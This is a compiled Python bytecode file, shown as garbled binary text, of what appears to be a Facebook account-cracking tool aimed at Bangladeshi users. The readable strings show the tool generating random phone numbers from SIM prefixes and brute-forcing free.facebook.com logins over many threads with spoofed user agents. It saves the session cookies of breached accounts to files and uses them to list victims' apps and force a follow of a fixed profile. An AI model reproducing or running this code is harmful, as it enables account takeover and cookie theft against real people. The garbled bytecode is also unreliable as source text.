o    ÇÛ>cr5  ã                   @   s¼  d dl Z d dlZd dlZd dlZd dlZe  d¡ e  d¡ G dd dZdd Zdd	 Zd dl Z d dlZd dlZd dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZe  d¡ d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ zd dlZd dlmZ d dlZd dlmZ W n ey«   e  d¡ e  d¡ Y nw dd Zdd ZG dd dZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*d Z+d!Z,d"Z-d#Z.d$Z/d%Z0d&Z1d'Z2d(Z3d)Z4d*Z5d+Z6e&e'e(e)e*e+e,e-gZ7e 8e7¡Z9e :¡ Z:e: ;d,¡Z<e :¡ Z=e=j>Z?e=j@ZAe=jBZCe D¡ ZDd-ZEd aFg aGg aHd.d/ ZId d0lmJZK d d1l mZL eMeK d2 ZNeNd3kr=eNd3 ZOd4ZPneNZOd5ZPzeQd6 d7ZRd8ZSd8ZSeTeReSv rYe  d/¡ n	 W n   eQd9 Y d:d; ZUg ZVg ZWeXd<D ]`ZYd=ZZe 8g d>¢¡Z[d?Z\e 8g d@¢¡Z]e ^dAdB¡Z_e 8g d@¢¡Z`dCZae ^dDdE¡ZbdFZce ^dGdH¡Zde ^dIdJ¡ZedKZfeZ dLe[ dMe\ e] e_ e` dNea eb dOec dOed dOee dLef ZgeW heg¡ qpdPdQ ZcdRdS Zie  dS )Té    Nzgit pullzpkg install curlc                   @   ó   e Zd Zdd ZdS )Újalanc                 C   s   d S ©N© )ÚselfÚzr   r   úX-RANDOM.pyÚ__init__   s   újalan.__init__N©Ú__name__Ú__module__Ú__qualname__r	   r   r   r   r   r   	   s    r   c                  C   sR   t  d¡ tt td td td} | dkr#t  d¡ t  d S d d d S )NÚclearz&    [1] FIRST FOLLOW MY GITHUB ACCOUNTz    [2] EXITz    CHOOSE OPTION : Ú1z,xdg-open https://github.com/KHALID-CYBER-404z[1;31mEXIT[0;97m)ÚosÚsystemr   ÚlogoÚprintÚinputÚo©Zoptr   r   r   Úud   s   r   c                  C   sÄ   t  d¡ tt td td td td td td td td	} | dkr0t  d dkr;t  d¡ d S d dkrFt  d¡ d S d dkrQt  d¡ d S d dkr\t  d¡ d S d d d S )Nr   z)	           [1;31mRANDOM NUMBER CRACKINGÚ z1[1;32m    [1][1;33m RANDOM BD ACCOUNT CRACKING z([1;32m    [2] [1;32mCONTACT WITH OWNERz2[1;32m    [3] [1;32mSUBSCRIBE MY YOUTUBE CHANNELz,[1;32m    [4] [1;32mJOIN MY FACEBOOK GROUPz[1;32m    [0] [1;31mEXITz   [1;32m CHOOSE OPTION : r   Ú2z2xdg-open https://www.facebook.com/KHALID.CYBER.404Ú3zNxdg-open https://youtube.com/c/KhaliDTechBd1?utm_source=EKLEiJECCKjOmKnC5IiRIQÚ4z.xdg-open fb://group/1514685669011353?ref=shareÚ0Úexitz$[1;31m  CHOOSE VALID OPTION[0;97m)r   r   r   r   r   r   Úir   r   r   r   r      s2   r   )ÚBeautifulSoup)Údate)Údatetime)Úsleep)ÚThreadPoolExecutor)ÚConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4c              	   C   sf  | j dd|idj}t|d}|jddd}dd	 | d¡D }t|dkr2tdtttttf  n$tdt	 t  tt|D ]}tdt|d ||  dd¡tf  qA| j dd|idj}t|d}|jddd}dd	 | d¡D }t|dkrtdtttttf  d S tdt	 t  tt|D ]}tdt|d ||  dd¡tf  qtd d S )Nz:https://free.facebook.com/settings/apps/tabbed/?tab=activeÚcookie©Úcookiesúhtml.parserZformÚpost)Úmethodc                 S   ó   g | ]}|j qS r   ©Útext©Ú.0r   r   r   r   Ú<listcomp>M   ó    zcek_apk.<locals>.<listcomp>Zh3r   u4   %s[%sð%s] %s   SORRY THERE IS NO ACTIVE  APK%s  u+   [ð®] %s [1;95m   YOUR ACTIVE APPS     :z[%s%s] %s%sé   zDitambahkan padaz Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   r,   r   r-   r/   r   r   r   r1   Y   r2   u;   %s[%sð%s] %sSORRY THERE IS NO EXPIRED APK%s           u&   [ð¥º] %s [1;95mYOUR EXPIRED APPS  :ZKedaluwarsaz Kedaluwarsar   )Úgetr.   r    ÚfindZfind_allÚlenr   ÚNÚMÚWHITEÚGREENÚrangeÚreplace)ÚsessionÚcokiÚwÚsopÚxZgamer   r   r   r   Úcek_apkI   s&   &&rB   c                 C   s\   t |jdd|ifi d¤jd}|jdi d¤ d¡}|jd	t| d|ifi d¤j d S )Nz8https://free.facebook.com/profile.php?id=100015315258519r&   r'   r)   ÚaÚIkuti)ÚstringZhrefúhttps://free.facebook.com)rC   rD   )r    r4   r.   r5   Ústr)r   r=   r>   Úrr4   r   r   r   Úfollowc   s   ÿÿÿÿÿrI   c                   @   r   )r   c                 C   s2   |d D ]}t j |¡ t j ¡  t d¡ qd S )NÚg;ßOn?)ÚsysÚstdoutÚwriteÚflushÚtimer#   )r   r   Úer   r   r   r	   m   s   ýr   Nr   r   r   r   r   r   l   s    z[1;91mz[1;97mz[1;32mz[1;33mz[1;34mz[1;35mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz%H:%Mu}	       [1;92m  âââââââââââââââââââââââââââââââââââââââââââââââââââââââ  [1;92m  â                                                     â  [1;92m  â  [1;91m   ââ   ââ ââ   ââ  âââââ  ââ      ââ ââââââ   [1;92m    â  [1;92m  â  [1;92m   ââ  ââ  ââ   ââ ââ   ââ ââ      ââ ââ   ââ  [1;92m    â  [1;92m  â  [1;93m   âââââ   âââââââ âââââââ ââ      ââ ââ   ââ  [1;92m    â  [1;92m  â  [1;94m   ââ  ââ  ââ   ââ ââ   ââ ââ      ââ ââ   ââ  [1;92m    â  [1;92m  â  [1;95m   ââ   ââ ââ   ââ ââ   ââ âââââââ ââ ââââââ   [1;92m    â  [1;92m  â                                                     â  [1;92m  âââââââââââââââââââââââââââââââââââââââââââââââââââââââ   [1;92m âââââââââââââââââââââââââââââââââââââââââââââââââââââââ   [1;92m â    [1;91m[[1;92m+[1;91m][1;92mJUST NOW LOG INABLE RNDM ACCOUNT CRACKER[1;91m[[1;92m+[1;91m]   [1;92mâ   [1;92m âââââââââââââââââââââââââââââââââââââââââââââââââââââââ[1;92m    âââââââââââââââââââââââââââââââââââââââââââââââââââââââ[1;92m    â[[1;91mâ[1;92m] DEVELOPER  :            KHALID SHAIFULLAH        â[1;92m    â[[1;91mâ[1;92m] FACEBOOK   :            KHALID SHAIFULLAH        â[1;92m    â[[1;91mâ[1;92m] GITHUB     :            KHALID-CYBER-404         â[1;92m    â[[1;91mâ[1;92m] WHATSAPP   :            +8801798396843           â[1;92m    â[[1;91mâ[1;92m] TOOLS      :            UID CRACK                â [1;92m   âââââââââââââââââââââââââââââââââââââââââââââââââââââââc                   C   s   t  d¡ tt d S )Nr   )r   r   r   r   r   r   r   r   r   ­   s   r   )Ú	localtime)r   é   é   ZPMZAMz([1;33mLOADING ASSET FILES ... [0;97mgÍÌÌÌÌÌ@z5.2z*[1;31mNO INTERNET CONNECTION ... [0;97mc                 C   s<   g d¢}|D ]}t d|  | f tj ¡  t d¡ qd S )N)z.   z..  z... z.... úr3   )r   rK   rL   rN   rO   r#   )r.   Ztitikr   r   r   r   ÚdynamicÅ   s   þrU   i'  zMozilla/5.0 (Linux; U; Android)r   r   Ú5Ú6Ú7Ú8Ú9Z10Z11Z12Z13Z14Z15Z16Z17z en-us; GT-)ÚAÚBÚCÚDÚEÚFÚGÚHÚIÚJÚKÚLr8   r7   ÚOÚPÚQÚRÚSÚTÚUÚVÚWÚXÚYÚZr3   iç  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/éI   éd   r   ih  i$  é(   é   zMobile Safari/537.36ú z; z) Ú.c                  C   st  g } g }t j t j t  d¡ tt td td td}td ttd}t	|D ]}d dd t	d	D ¡}|  |¡ q-t  d¡ tt ttd}g }td t	|D ]}td}	| |	¡ qZtddA}t  tt| }td|  td td | D ]}|dd  g}|| }|D ]}| |¡ q| t|||¡ qW d    n1 s¯w   Y  td d S )Nr   z#[1;31m	        SELECT SIM CODE  zc[1;36m  BD SIM-CODES:  [1;33m88017, [1;33m88019 ,[1;33m88018 ,[1;33m88016  (BEST:88017)[0;97mz    CHOOSE : r   z<    EXAMPLE: 2000, 3000, 50000, 100000 PUT CLONING LIMIT: c                 s   s    | ]	}t  tj¡V  qd S r   )ÚrandomÚchoicerE   Údigits)r0   Ú_r   r   r   Ú	<genexpr>ï   s    zi.<locals>.<genexpr>é   z,    [+] HOW MANY PASSWORD YOU WANT TO ADD : z0    [+] ENTER YOUR PASSWORD (BEST:bangladesh) : é2   )Zmax_workersz[1;36m    [+]TOTAL ACCOUNTS: z'[1;36m    [+]CRACKING HAS BEEN STARTEDz+[1;36m    [+]USE A FAST NETWORK FOR OK IDSr3   z.    [1;36mCRACKING PROCESS HAS BEEN COMPLETED)r   ÚgetuidÚgeteuidr   r   r   r   r   Úintr;   ÚjoinÚappendÚThreadPoolr   rG   r6   ZsubmitÚrcrack)ÚuserZtwfÚcodeÚlimitZnmbrZnmpZpassxZHamiiIDZbilalZpwwZmansheraÚtlZloveÚpwxÚuidZEmanr   r   r   r   à   sJ   ûúr   c                 C   sp  z0|D ]}t  t¡}t ¡ }| d¡j}t dt	|¡ d¡t dt	|¡ d¡t dt	|¡ d¡t dt	|¡ d¡dd| |dd		}i ddddddddddddddddddddddd d!d"d#d$d%d&d'd(d)d*d+d,d-|d.¥}|jd/||d0j}	|j ¡  ¡ }d1|v rØd2 d3d4 |j ¡  ¡ D ¡}|d5d6 }td7| d8 | d9 | d: | d;  t|| td<d= |d8 | d> ¡ t |¡  n<d?|v rd2 d@d4 |j ¡  ¡ D ¡}|dAdB }tdC| d8 | d;  tdDd= |d8 | dE ¡ t |¡  nqtd7 atj dFtt|ttttf ¡f tj ¡  W d S    Y d S )GNrF   zname="lsd" value="(.*?)"r3   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"r   zLog In)	ZlsdZjazoestZm_tsZliZtry_numberZunrecognized_triesZemailÚpassZloginZ	authorityzfree.facebook.comr+   ZGETZschemeZhttpsZacceptztext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=1zcache-controlz#no-cache, no-store, must-revalidateZrefererzhttps://t.facebook.com/z	sec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"zsec-ch-ua-mobilez?1zsec-ch-ua-platformZWindowszsec-fetch-destZdocumentzsec-fetch-modeZnavigatezsec-fetch-sitezsame-originzsec-fetch-userz?0Zpragmazno-cacheÚpriorityzu=0zcross-originr   )zcross-origin-resource-policyzupgrade-insecure-requestszuser-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)ÚdataZheadersZc_userú;c                 S   ó   g | ]\}}|d  | qS ©ú=r   ©r0   ÚkeyÚvaluer   r   r   r1   3  ó    zrcrack.<locals>.<listcomp>r~   é   z    [1;32m[KHALID-OK]  z | u(      [1;33m    [ð¥]  COOKIES = [1;32mz  z	  [0;97mz/sdcard/KHALID-OK.txtrC   rJ   Zcheckpointc                 S   r   r   r   r   r   r   r   r1   ;  r   é   é'   z    [1;31m[KHALID-CP]  z/sdcard/KHALID-CP.txtz z,     %s[KHALID] [%s/%s]  OK:- %s  CP:- %s )ry   rz   ÚugenÚrequestsZSessionr4   r.   ÚreÚsearchrG   Úgroupr*   r(   Zget_dictÚkeysr   Úitemsr   rB   ÚopenrM   Úoksr   ÚcpsÚlooprK   rL   rb   r6   rN   )r   r   r   ZpsZpror=   Zfree_fbZlog_dataZheader_freefbÚloZlog_cookiesr>   Zcidr   r   r   r     s   ÷ÿþýüûúùø	÷öõôóòñðí($r   )jr   rK   rO   r   Zuuidr   r   r   r   Zjsonry   r   rE   ÚplatformÚbase64Zbs4r    r@   Zressr"   r!   r#   ZwaktuZconcurrent.futuresr$   r   Z	mechanizeZrequests.exceptionsr%   ÚModuleNotFoundErrorrB   rI   ZREDr9   r:   ZYELLOWZBLUEZORANGErh   r8   rb   re   r\   rm   rg   r7   r[   ZBNZBBLZBPZBBZBKZBHZBMZBAZmy_colorrz   ZwarnaZnowÚstrftimeZ	dt_stringZcurrentZyearÚtaZmonthZbuZdayZhaZtodayr   r¥   r£   r¤   r   rQ   ÚltÚcmdr   ZltxrC   Útagr   ÚvÚupdaterG   rU   Zugen2r   r;   ZxdZaaÚbÚcÚdZ	randrangerP   ÚfÚgÚhr   ÚjÚkÚlZuaku2r   r   r   r   r   r   Ú<module>   sØ    Pþ	ÿB'C